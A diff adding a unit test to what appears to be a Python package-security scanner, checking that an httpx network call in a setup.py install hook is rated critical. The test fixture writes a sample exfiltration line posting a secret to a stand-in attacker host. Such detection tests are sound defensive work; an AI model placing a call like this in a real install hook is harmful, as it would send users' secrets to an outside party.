@@ -144,6 +144,16 @@ class TestScanPythonFileCritical:
         findings = scan_python_file(str(setup), is_hook=True)
         assert any(f.level == RiskLevel.CRITICAL for f in findings)
 
+    def test_httpx_network_call_in_hook_is_critical(self, tmp_path):
+        """httpx (a common modern HTTP client) in an install hook → CRITICAL."""
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import httpx\n"
+            "httpx.post('https://attacker.example/exfil', data=secret)\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
     def test_dotted_import_network_call_in_hook_is_critical(self, tmp_path):
         """Regression: `import urllib.request; urllib.request.urlopen(...)` must
         resolve to urllib.request.urlopen (not the doubled
